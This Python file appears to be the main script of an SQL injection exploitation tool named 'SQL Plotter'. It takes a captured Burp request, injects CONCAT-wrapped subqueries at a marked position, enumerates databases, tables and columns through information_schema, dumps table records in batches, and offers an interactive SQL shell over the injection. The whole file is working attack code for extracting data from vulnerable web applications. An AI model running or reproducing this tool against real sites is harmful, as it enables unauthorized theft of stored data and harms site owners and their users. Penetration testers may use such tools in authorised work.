from modules.tools.requestHandler import BurpRequest
from modules.variables.dbms import Host
from os.path import exists
from urllib.parse import quote
import argparse
from modules.tools.Random import Sequence
from pickle import load as cache_load, dump as cache_dump
from os import system
from modules.variables.colors import Color
from prompt_toolkit import prompt
from prompt_toolkit.shortcuts import clear

# Sequence generators for random strings
seperator_sequence = Sequence(use_low=False, use_up=False, use_dig=False, use_spec=True, specs="~!@#$^&")
hook_sequence = Sequence(use_low=True, use_up=True, use_dig=True)
max_packet_len = 724500

def save_cache(data, filename='cache.db'):
    if not filename.endswith(".db"):
        filename += ".db"
    with open(filename, 'wb') as f:
        cache_dump(data, f)
    print(f"{Color.OKGREEN}[*] Cache saved to {filename}{Color.ENDC}")

def load_cache(filename='cache.db'):
    try:
        if not filename.endswith(".db"):
            filename += ".db"
        with open(filename, 'rb') as f:
            data = cache_load(f)
            print(f"{Color.OKGREEN}[*] Cache loaded successfully from {filename}{Color.ENDC}")
            return data
    except FileNotFoundError:
        print(f"{Color.FAIL}[!] Cache file {filename} not found{Color.ENDC}")
        return None

def exists_cache(filename='cache.db'):
    if not filename.endswith(".db"):
        filename += ".db"
    return True if exists(filename) else False

def split_first_level(input_string):
    result, current, depth = [], [], 0
    append_result = result.append  # localized for performance
    for char in input_string:
        if char == ',' and depth == 0:
            append_result(''.join(current).strip())
            current = []
        else:
            if char in '({[':
                depth += 1
            elif char in ')}]':
                depth -= 1
            current.append(char)
    if current:
        append_result(''.join(current).strip())
    return result

def query_converter(query: str, field_separator: str = "0x2c", random: str = "") -> str:
    """
    Converts a given query into a sanitized format suitable for execution.
    
    :param query: The SQL query to be converted.
    :param field_separator: The separator to use between fields.
    :param random: A random string to use in the query.
    :return: The sanitized SQL query.
    """
    if not random:
        random = hook_sequence.generate_sequence(size=4)
    separator = "0x" + "".join([hex(ord(sym))[-2:] for sym in field_separator])
    
    query = query.strip().strip(";")
    sanitized_query = ""
    
    if query.lower() == "show databases":
        sanitized_query = "SELECT GROUP_CONCAT(schema_name SEPARATOR '\\n') FROM information_schema.schemata"
    elif query.lower() == "show tables":
        columns = f", {separator}, ".join(["t.TABLE_SCHEMA", "t.TABLE_NAME", "c.COLUMN_LIST", "t.TABLE_ROWS", "t.AVG_ROW_LENGTH", "t.DATA_LENGTH", "t.CREATE_TIME"])
        sanitized_query = f"""WITH ColumnLists AS ( SELECT TABLE_SCHEMA, TABLE_NAME, GROUP_CONCAT(COLUMN_NAME ORDER BY ORDINAL_POSITION SEPARATOR ':') AS COLUMN_LIST FROM INFORMATION_SCHEMA.COLUMNS GROUP BY TABLE_SCHEMA, TABLE_NAME ) SELECT GROUP_CONCAT(REPLACE(CONCAT({columns}), '\\n', '\\\\n') SEPARATOR '\n' ) AS info FROM INFORMATION_SCHEMA.TABLES t JOIN ColumnLists c ON t.TABLE_SCHEMA = c.TABLE_SCHEMA AND t.TABLE_NAME = c.TABLE_NAME"""
    elif query.lower().startswith("select"):
        select_part, from_part = query.lower().split(" from ", 1)
        columns = split_first_level(select_part[7:].strip())
        nullsafe_columns = [f"COALESCE({column}, 'NULL')" for column in columns]
        columns_str = f", {separator}, ".join(nullsafe_columns)
        sanitized_query = f"SELECT GROUP_CONCAT(REPLACE(CONCAT({columns_str}), '\\n', '\\\\n') SEPARATOR '\\n') FROM (SELECT * FROM {from_part.strip()}) AS tb"
    else:
        sanitized_query = query
    
    return sanitized_query

def strip_records(records: list, separator: str = ",") -> list:
    """
    Splits records using the specified separator.
    
    :param records: List of records to split.
    :param separator: The separator to use for splitting.
    :return: List of split records.
    """
    if records and (separator in records[0]):
        return [record.split(separator) for record in records]
    return records

def strip_response(response: str, start: str, end: str) -> list:
    """
    Extracts records from the response text between specified start and end markers.
    
    :param response: The response text.
    :param start: The start marker.
    :param end: The end marker.
    :return: List of extracted records.
    """
    if response:
        lines = response.split("\n")
        records = []
        writing = False
        found = False
        for line in lines:
            if writing:
                if not line.startswith(end):
                    records.append(line)
                else:
                    found = True
                    break
            elif line.endswith(start):
                writing = True
        if not found:
            for line in lines:
                if start in line:
                    records = line.split(start+r'\n',1)
                    if not len(records)>1:
                        break
                    records = records[1].split(r'\n'+end,1)
                    records = records[0].split(r"\n")
                    break
        return records

def query_handler(request: BurpRequest, position: str, query: str) -> list:
    """
    Handles the SQL query by sending it through the specified Burp request.
    
    :param request: The BurpRequest object.
    :param position: The position of the payload in the request.
    :param query: The SQL query to execute.
    :return: The results of the query.
    """
    if request and position and query:
        separator = seperator_sequence.generate_sequence(size=3)
        start = hook_sequence.generate_sequence(size=5)
        end = hook_sequence.generate_sequence(size=5)
        payload = f"CONCAT('{start}\\n',({query_converter(query=query, field_separator=separator)}),'\\n{end}')"
        response = request.send_request(parameters=[(position, quote(payload))])
        if response and response.status_code!=414:
            results = strip_records(strip_response(response=response.text, start=start, end=end), separator=separator)
            return results
        elif response and response.status_code == 414:
            print(f"{Color.FAIL}[!] Unable to handle Payload Length (Status 414: URL Length Exceeds)!{Color.ENDC}")
            return 414
    return None

def refresh_records(table: Host.Database.Table, db_name: str, request: BurpRequest, position: str):
    if table.name and db_name and request and position:
        count = 0
        columns = ",".join([f"`{column}`" for column in table.columns])
        total_rows = int(table.total_rows) if table.total_rows.isdigit() else 0
        avg_row = int(table.avg_row_length) if table.avg_row_length and table.avg_row_length.isdigit() and table.avg_row_length != '0' else 500
        if total_rows > 0:
            diff = max_packet_len // avg_row
            any_result = False
            try:
                table.records = []
                runs = []
                error = False
                for start in range(0, total_rows, diff):
                    print(f"{Color.OKBLUE}[*] Fetching Records {start + 1} - {start + diff} FROM {db_name}.{table.name} | Completed {start}{Color.ENDC}", end="\r")
                    response = query_handler(request=request, position=position, query=f"SELECT {columns} FROM `{db_name}`.`{table.name}` LIMIT {start},{diff}")
                    if type(response) == int:
                        error = True
                        break
                    if response and len(response) > 0:
                        table.records += response
                        any_result = True
                        runs.append(len(response))
                if not error:
                    print(f"{Color.OKGREEN}[*] Fetched {total_rows} Records FROM {db_name}.{table.name} | Received {len(table)} Records{Color.ENDC}                                          ")
                else:
                    print(f"{Color.FAIL}[!] Column Length for {db_name}.{table.name} Exceeds Max Limit!{Color.ENDC}                             ")
            except KeyboardInterrupt:
                print(f"{Color.WARNING}[!] Retrieval Interrupted by User!{Color.ENDC}")
            finally:
                print(f"{Color.OKGREEN}[*] Total Number of Records Fetched ({table.name}): {len(table)}{Color.ENDC}") if any_result else print(f"{Color.FAIL}[!] No Records Received For ({table.name}){Color.ENDC}                                                       ")
            return True if not error else False
        else:
            print(f"{Color.FAIL}[!] No Records in {db_name}.{table.name}{Color.ENDC}")
        return None
    return False

def refresh_database(database: Host.Database, request: BurpRequest, position: str):
    if database.name and request and position:
        completed = []
        failed = []
        for table in database:
            result = refresh_records(table=table, db_name=database.name, request=request, position=position)
            if result:
                completed.append(table.name)
            elif result == False:
                failed.append(table.name)
        print(f"{Color.OKGREEN}[*] Refreshing Database Completed! Success - {len(completed)}\t Failed - {len(failed)}{Color.ENDC}")
        if failed:
            print(f"{Color.FAIL}[!] Failed Tables: - {', '.join(failed)}{Color.ENDC}")
        return True
    return False
  
            

def main():
    """
    The main function that initializes the argument parser and handles the user inputs.
    """
    parser = argparse.ArgumentParser(description="SQL Plotter")
    parser.add_argument("-r", "--request-file", required=True, help="File containing Burp request")
    parser.add_argument("-p", "--position", default="PAYLOAD", help="Payload position in request file (default=PAYLOAD)")
    parser.add_argument("-q", "--query", default="DATABASE()", help="SQL Payload (Query to be executed)")
    parser.add_argument("-db", "--database", default=None, help="Set Database Name")
    parser.add_argument("-tb", "--table", default=None, help="Set Table Name")
    parser.add_argument("--sql-shell", action="store_true", help="Start a Friendly Interactive SQL prompt")

    args = parser.parse_args()
    host = None
    current_db = args.database
    current_tb = args.table
    position = args.position
    schema_found = False
    continued = False
    try:
        request_file = args.request_file
    # If Request File Exists
        if exists(request_file):
            request = BurpRequest(request_file)
            hostname = request.headers.get("Host", "")
        # If Cache Exists
            if exists_cache(hostname) and input(f"{Color.OKBLUE}[?] Database cache found for {hostname}, do you want to load it? (Y/n): {Color.ENDC}") in ["Y", "y", ""]:
                host = load_cache(hostname)
                schema_found = True
        # If Cache Doesn't Exists
            else:
                host = Host(hostname)
        # --sql-shell
            if args.sql_shell:
                if not schema_found:
                    print("[*] Grabbing Schema For Host",hostname,end="\r")
                    schema = query_handler(request=request, position=position, query="show tables;")
                    if not schema:
                        print(f"{Color.FAIL}[!] Failed to retrieve tables information!{Color.ENDC}                ")
                        return
                    host.handler(schema)
                    print("[*] Schema Received For Host",hostname,"            ")
            # SQL-Shell Prompt Handler
                while True:
                    # padding = 12+len(position)+(len(current_db) if current_db else 14)+(len(current_tb) if current_tb and current_tb else 14)
                    if not continued:
                        print(f"{Color.BOLD}$[{Color.OKGREEN+current_db if current_db else Color.FAIL+'(Not Selected)'}{Color.ENDC}.{Color.BOLD}{Color.OKGREEN+current_tb if current_db and current_tb else Color.FAIL+'(Not Selected)'}{Color.ENDC}{Color.BOLD}] ({Color.OKCYAN}{position}{Color.ENDC}) - Enter Your Query or use 'help' to see Supported Commands{Color.ENDC}")
                    # print('',end=f'\033[{padding}C')
                    query = prompt("SQL-Shell >> ").strip().strip(";").split(" ")
                    continued = False

                # Nothing
                    if not query[0] and len(query)==1:
                        continued = True
                        continue
                # Exit
                    if query[0].lower() == "exit":
                        break
                # Help
                    elif query[0].lower() == "help":
                        print(f"{Color.OKCYAN}Available commands:{Color.ENDC}")
                        print(f"{Color.OKCYAN}- use <database>: Select a database{Color.ENDC}")
                        print(f"{Color.OKCYAN}- use table <table>: Select a table{Color.ENDC}")
                        print(f"{Color.OKCYAN}- show databases: Show all databases{Color.ENDC}")
                        print(f"{Color.OKCYAN}- show tables: Show all tables in the selected database{Color.ENDC}")
                        print(f"{Color.OKCYAN}- show records <limit>: Show records from the selected table{Color.ENDC}")
                        print(f"{Color.OKCYAN}- select <query>: Execute a SELECT query{Color.ENDC}")
                        print(f"{Color.OKCYAN}- refresh records: Refresh records of the selected table{Color.ENDC}")
                        print(f"{Color.OKCYAN}- refresh database: Refresh the selected database{Color.ENDC}")
                        print(f"{Color.OKCYAN}- clear: Clear the screen{Color.ENDC}")
                        print(f"{Color.OKCYAN}- exit: Exit the SQL shell{Color.ENDC}")
                # Use
                    elif query[0].lower() == "use":
                    # Default
                        if len(query) == 2:
                            current_db = query[1]
                            current_tb = None
                            print(f"{Color.OKGREEN}[*] Database selected: {current_db}{Color.ENDC}")
                            if not host[current_db]:
                                print(f"{Color.FAIL}[!] Database {current_db} not found in schema!{Color.ENDC}")
                    # Table
                        elif len(query) == 3 and query[1].lower() == "table":
                            current_tb = query[2]
                            if host[current_db]:
                                if type(host[current_db][current_tb]) == Host.Database.Table:
                                    print(f"{Color.OKGREEN}[*] Table selected: {current_tb}{Color.ENDC}")
                                else:
                                    print(f"{Color.FAIL}[!] Failed to access table {current_tb}{Color.ENDC}")
                            else:
                                print(f"{Color.FAIL}[!] Failed to access database {current_db}{Color.ENDC}")
                # Show
                    elif query[0].lower() == "show":
                    # Databases
                        if query[1] == "databases":
                            print(f"{Color.OKGREEN}[*] Databases: - {', '.join([db.name for db in host])}{Color.ENDC}")

                    # Tables
                        elif query[1] == "tables":
                            if current_db:
                                if host.get(current_db):
                                    print(f"{Color.OKGREEN}[*] Available Tables: -{Color.ENDC}")
                                    for tb in host[current_db]:
                                        info = tb.info()
                                        print(f"\t{Color.OKBLUE}{tb.name}{Color.ENDC} --> {Color.OKGREEN}Rows: {info['total_rows']}\t Average Row Length: {info['avg_row_length']}\t Create Time: {info['create_time']}\n\t{Color.ENDC}Columns: {' - '.join(info['columns'])}")
                                else:
                                    print(f"{Color.FAIL}[!] Unable to access database!{Color.ENDC}")
                            else:
                                print(f"{Color.FAIL}[!] Please select a database first!{Color.ENDC}")

                    # Records
                        elif query[1] == "records":
                            if current_db:
                                if host.get(current_db):
                                    if current_tb:
                                        table = host[current_db].get(current_tb)
                                        if type(table) == Host.Database.Table:
                                            limit = int(query[2]) if len(query) == 3 and query[2].isdigit() else 20
                                            lrec = len(table)
                                            if lrec:
                                                records = table.show_records(limit)
                                                print(f"{Color.OKGREEN}[*] Total Number of Records {lrec}{Color.ENDC}")
                                            else:
                                                if refresh_records(table=table, db_name=current_db, request=request, position=position):
                                                    host[current_db][current_tb].show_records(limit)
                                                    print(f"{Color.OKGREEN}[*] Total Number of Records {len(host[current_db][current_tb])}{Color.ENDC}")
                                                else:
                                                    print(f"{Color.FAIL}[!] No Records in {current_db}.{current_tb}{Color.ENDC}")
                                        else:
                                            print(f"{Color.FAIL}[!] Unable to access table!{Color.ENDC}")
                                    else:
                                        print(f"{Color.FAIL}[!] Please select a table first!{Color.ENDC}")
                                else:
                                    print(f"{Color.FAIL}[!] Unable to access database!{Color.ENDC}")
                            else:
                                print(f"{Color.FAIL}[!] Please select a database first!{Color.ENDC}")

                # Select
                    elif query[0].lower() == "select":
                        query = " ".join(query)
                        response = query_handler(request=request, position=position, query=query)
                        if response:
                            if type(response[0]) == str:
                                for r in response:
                                    print(r)
                            else:
                                for r in response:
                                    print("\t".join(r))
                        else:
                            print(f"{Color.FAIL}[!] No response received from the server!{Color.ENDC}")
                            if "*" in query:
                                print(f"{Color.WARNING}[!] Wild card for columns may not be supported{Color.ENDC}")

                # Refresh
                    elif query[0].lower() == "refresh":
                    # Records
                        if len(query) == 2 and query[1].lower() == "records":
                            if current_db and host[current_db]:
                                refresh_records(table=host[current_db][current_tb], db_name=current_db, request=request, position=position)
                            else:
                                print(f"{Color.FAIL}[!] Please select a valid database{Color.ENDC}")
                    # Database
                        elif len(query) == 2 and query[1].lower() == "database":
                            if current_db and host[current_db]:
                                if not refresh_database(database=host[current_db], request=request, position=position):
                                    print(f"{Color.FAIL}[!] Failed to Refresh Database{Color.ENDC}")
                            else:
                                print(f"{Color.FAIL}[!] Please select a valid database{Color.ENDC}")
                    # Else
                        else:
                            response = query_handler(request=request, position=position, query=f"show tables")
                            if response:
                                host.handler(response)
                                print(f"{Color.OKGREEN}[*] Database Refreshed Successfully{Color.ENDC}")
                            else:
                                print(f"{Color.FAIL}[!] Failed to refresh database{Color.ENDC}")

                # Clear
                    elif query[0].lower() == "clear":
                        clear()

                # Else
                    else:
                        print(f"{Color.FAIL}[!] Query '{query[0]}' not supported!{Color.ENDC}")
        # Something else
            else:
                response = query_handler(request=request, position=position, query=args.query)
                if response:
                    print(response)
                else:
                    print(f"{Color.FAIL}[!] No response received from the server!{Color.ENDC}")
    # If Request File Doesn't Exists
        else:
            print(f"{Color.FAIL}[!] Failed to find request file at {args.request_file}{Color.ENDC}")
    except KeyboardInterrupt:
        print(f"{Color.WARNING}Operation stopped by user.{Color.ENDC}")
    except Exception as e:
        print(f"{Color.FAIL}[!] An error occurred: {e}{Color.ENDC}")
    finally:
        if host:
            save_cache(host, host.name)

if __name__ == "__main__":
    main()
